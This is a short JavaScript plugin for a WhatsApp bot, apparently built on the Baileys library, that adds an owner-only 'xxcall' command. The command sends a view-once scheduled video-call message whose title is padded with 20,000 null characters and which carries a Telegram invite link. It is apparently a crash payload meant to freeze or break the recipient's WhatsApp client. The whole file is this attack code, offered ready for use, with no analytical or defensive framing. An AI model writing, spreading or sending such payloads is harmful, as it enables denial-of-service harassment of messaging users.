let handler = async (m, { conn }) => {
await conn.relayMessage(m.chat, {
            viewOnceMessage: {
                message: {
                    scheduledCallCreationMessage: {
                        callType: "VIDEO",
                        scheduledTimestampMs: Date.now() + 9741,
                        title: " 𝐃𝐄𝐀𝐓𝐇 𝐃𝐎𝐌𝐈𝐍𝐀 " + "\0".repeat(20000),
                        inviteCode: 'https://t.me/DEATH_OF_TELEGRAM',
                    }
                }
            }
        }, {});
}
handler.command = /^(xxcall)$/i
handler.owner = true
export default handler;